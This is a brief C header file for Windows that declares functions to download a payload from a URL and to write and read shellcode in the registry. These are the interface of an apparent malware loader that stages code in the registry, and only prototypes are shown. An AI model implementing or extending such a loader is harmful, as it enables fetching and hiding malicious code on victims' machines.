#pragma once
#include <windows.h>

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);

BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload, IN LPCSTR RegisterName, IN LPCSTR RegisterKeyName);
BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize, IN LPCSTR RegisterName, IN LPCSTR RegisterKeyName);